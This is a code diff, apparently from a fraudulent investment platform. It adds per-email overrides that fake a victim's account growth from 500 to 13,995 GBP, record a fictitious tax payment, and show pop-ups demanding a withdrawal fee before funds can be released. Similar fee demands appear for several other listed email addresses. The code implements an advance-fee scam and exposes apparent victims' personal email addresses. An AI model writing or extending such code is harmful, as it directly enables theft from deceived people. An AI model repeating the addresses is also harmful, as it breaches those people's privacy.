@@ -213,6 +213,19 @@ const MANUAL_PROGRESS_OVERRIDES: Record<
     currency: "GBP",
     forceProgressPct: 100,
     lockTaxDisplay: true
+  },
+  "ttvcurser@gmail.com": {
+    currentValue: 13995,
+    taxRate: 0.165,
+    taxDue: 2309.18,
+    taxRemaining: 0,
+    taxPaid: 5038.61,
+    initialHoldings: 500,
+    currency: "GBP",
+    forceProgressPct: 100,
+    forceStartIso: "2026-02-27T10:00:00-08:00",
+    forceDurationHours: 72,
+    lockTaxDisplay: true
   }
 };
 const COMPLETED_FREEZE_CURRENT_BY_EMAIL: Record<string, number> = {
@@ -231,12 +244,15 @@ const WITHDRAWAL_FEE_LOCK_BY_EMAIL: Record<string, { amount: number; currency: "
   "ammielcui@gmail.com": { amount: 1275, currency: "GBP" },
   "kas_12@hotmail.co.uk": { amount: 1655, currency: "GBP" },
   "samlebrun01@gmail.com": { amount: 680, currency: "USD" },
+  "ttvcurser@gmail.com": { amount: 500, currency: "GBP" },
   "tzahielk@gmail.com": { amount: 450, currency: "GBP" }
 };
 const WITHDRAWAL_FEE_ALERT_BY_EMAIL: Record<string, string> = {
   "ammielcui@gmail.com": "Withdrawal fee payment required: GBP 1,275.00. Clear this fee to continue.",
   "kas_12@hotmail.co.uk":
-    "Tax cleared successfully. A refundable withdrawal fee of GBP 1,655.00 is required to continue with withdrawal."
+    "Tax cleared successfully. A refundable withdrawal fee of GBP 1,655.00 is required to continue with withdrawal.",
+  "ttvcurser@gmail.com":
+    "Tax cleared successfully. A withdrawal fee of GBP 500.00 is required to continue with withdrawal."
 };
 const WITHDRAWAL_FEE_OK_UNLOCK_EMAILS = new Set(["samlebrun01@gmail.com", "tzahielk@gmail.com"]);
 const WITHDRAWAL_PROCESSING_WALLET_MESSAGE_BY_EMAIL: Record<
@@ -267,6 +283,9 @@ const TAX_CLEARED_POPUP_BY_EMAIL: Record<string, string> = {
     "Withdrawal pending. Clear withdrawal fee of $680.00 to release $2,550.00 to your wallet.",
   "kas_12@hotmail.co.uk":
     "Tax cleared successfully. Please clear the refundable withdrawal fee of GBP 1,655.00 to proceed with withdrawal."
+  ,
+  "ttvcurser@gmail.com":
+    "Tax cleared successfully. Please clear the withdrawal fee of GBP 500.00 to proceed with withdrawal."
 };
 const USER_PLAN_OVERRIDE_BY_EMAIL: Record<
   string,
@@ -333,6 +352,14 @@ const USER_PLAN_OVERRIDE_BY_EMAIL: Record<
     unit: "GBP",
     durationHours: 48,
     startIso: "2026-03-04T14:35:49-08:00",
+    ignorePriorWithdrawals: true
+  },
+  "ttvcurser@gmail.com": {
+    startValue: 500,
+    targetValue: 13995,
+    unit: "GBP",
+    durationHours: 72,
+    startIso: "2026-02-27T10:00:00-08:00",
     ignorePriorWithdrawals: true
   }
 };
